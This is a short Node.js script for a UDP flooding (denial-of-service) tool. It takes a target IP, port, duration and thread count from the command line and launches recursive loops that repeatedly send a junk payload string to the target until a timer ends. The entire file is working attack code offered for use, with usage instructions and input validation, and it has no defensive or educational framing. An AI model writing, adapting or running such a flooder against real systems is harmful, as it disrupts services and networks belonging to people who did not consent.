//Dependencies
const Is_IP = require("is-ip")
const DGram = require("dgram")
const Chalk = require("chalk")
const Delay = require("delay")

//Variables
const Self_Args = process.argv.slice(2)

const Client = DGram.createSocket("udp4")

//Functions
async function Initiate_A_Flooder(){
    await Delay(100)

    const Payload = "!@_n15=-1n1,,5<%@!%.>{424}_;}{[42424242]-[424JIROINj521n9558n15N%1n019505%)(@!%N!%%!()%!^)@!*!^)!N^n66n1l.6[pn1[6pn^NO^1-6-1n61-n6161=-6[1NO^Pn1i60n9i1n69016n16n16nop12k6np1on6k1p<>A<?>W<N,./awn,525n1;5"

    Client.send(Payload, Self_Args[1], Self_Args[0])
    console.log(`${Chalk.grey("[") + Chalk.yellow("WARNING") + Chalk.grey("]")} Sending payload to ${Self_Args[0]}:${Self_Args[1]}`)
    Initiate_A_Flooder()
}

//Main
if(Self_Args.length == 0){
    console.log(`node index.js <ip> <port> <time(Seconds)> <bots>
Example: node index.js 192.168.0.1 80 5 10`)
    process.exit()
}

if(Self_Args[0] == ""){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid IP.`)
    process.exit()
}

if(!Is_IP(Self_Args[0])){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid IP.`)
    process.exit()
}

if(Self_Args[1] == ""){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid port.`)
    process.exit()
}

if(isNaN(Self_Args[1])){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Port is not an Int.`)
    process.exit()
}

if(Self_Args[2] == ""){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid time.`)
    process.exit()
}

if(isNaN(Self_Args[2])){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Time is not an Int.`)
    process.exit()
}

if(Self_Args[3] == ""){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid bots.`)
    process.exit()
}

if(isNaN(Self_Args[3])){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Bots is not an Int.`)
    process.exit()
}

console.log(`${Chalk.grey("[") + Chalk.blueBright("INFO") + Chalk.grey("]")} Flooding started.`)
for( i = 0; i <= Self_Args[3]; i++ ){
    Initiate_A_Flooder()
}

setTimeout(function(){
    console.log(`${Chalk.grey("[") + Chalk.blueBright("INFO") + Chalk.grey("]")} Flooding finished.`)
    process.exit()
}, Self_Args[2] * 1000)
